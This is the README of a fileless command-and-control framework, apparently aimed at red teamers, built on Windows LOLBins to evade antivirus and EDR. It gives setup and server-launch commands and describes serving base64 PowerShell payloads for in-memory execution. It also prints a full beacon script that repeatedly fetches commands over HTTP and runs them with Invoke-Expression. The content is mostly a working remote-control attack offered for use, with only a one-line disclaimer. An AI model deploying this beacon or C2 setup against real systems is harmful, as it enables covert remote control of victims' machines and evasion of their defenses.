# ZeroTraceC2

![ZeroTraceC2](https://raw.githubusercontent.com/mchyasn/cybersecurity-tools/main/06-Command-and-Control-C2-Systems/ZeroTraceC2/screenshots/0.png)

## Description

**ZeroTraceC2** is a fileless Command and Control (C2) framework that leverages native Windows LOLBins (Living Off the Land Binaries) such as `mshta`, `certutil`, and `powershell`. It supports staged and stageless payload delivery where code is executed entirely in memory without writing to disk. This tool is designed for red teamers to simulate stealthy real-world adversaries evading traditional AV/EDR detections.

## Features

* Fileless payload delivery using PowerShell base64
* Uses LOLBins to execute payloads without dropping files
* Supports staged (multi-phase) and stageless modes
* Hosts PowerShell payloads over HTTP with a Flask C2 server
* Easily extendable command injection logic

## Installation

```bash
git clone https://github.com/your/repo.git
cd ZeroTraceC2
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

## Usage

### Start the C2 server:

```bash
python3 main.py --config configs/config.yaml
```

Expected:

```
 * Serving Flask app 'c2server.server'
 * Debug mode: off
```

### Fetch staged PowerShell payload:

```bash
curl http://127.0.0.1:8080/stage
```

This returns a `powershell -e <base64>` one-liner for in-memory execution.

### Fetch beacon PowerShell script:

```bash
curl http://127.0.0.1:8080/beacon.ps1
```

You will see a looped command puller:

```powershell
while ($true) {
  try {
    $cmd = Invoke-WebRequest -Uri "http://127.0.0.1:8080/command" -UseBasicParsing
    Invoke-Expression $cmd.Content
  } catch {}
  Start-Sleep -Seconds 10
}
```

## Configuration

`configs/config.yaml`:

```yaml
c2:
  host: "0.0.0.0"
  port: 8080
  mode: "staged"  # or stageless

payload:
  entry_point: "payloads/stage1.ps1"
```

* `mode`: Use `staged` for multi-step loading or `stageless` for all-in-one drop
* `entry_point`: Path to the PS1 file to be base64-encoded and served

## Screenshots

![ZeroTraceC2](https://raw.githubusercontent.com/mchyasn/cybersecurity-tools/main/06-Command-and-Control-C2-Systems/ZeroTraceC2/screenshots/0.png)
![ZeroTraceC2](https://raw.githubusercontent.com/mchyasn/cybersecurity-tools/main/06-Command-and-Control-C2-Systems/ZeroTraceC2/screenshots/1.png)

## License

MIT

## Disclaimer

🔥 For educational use only. Do not run without authorization.

## Author

\[mchyasn]
